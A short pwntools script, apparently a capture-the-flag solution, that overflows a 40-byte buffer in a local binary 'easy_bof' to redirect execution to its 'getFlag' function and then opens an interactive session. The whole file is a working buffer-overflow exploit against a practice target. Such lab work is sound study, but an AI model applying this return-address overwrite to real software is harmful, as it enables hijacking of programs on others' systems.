from pwn import *

p = process('./easy_bof')
elf = ELF('./easy_bof')
garbage = b'a'*40
target = p64(elf.symbols['getFlag'])
msgin = garbage + target
p.sendline(msgin)
p.interactive()
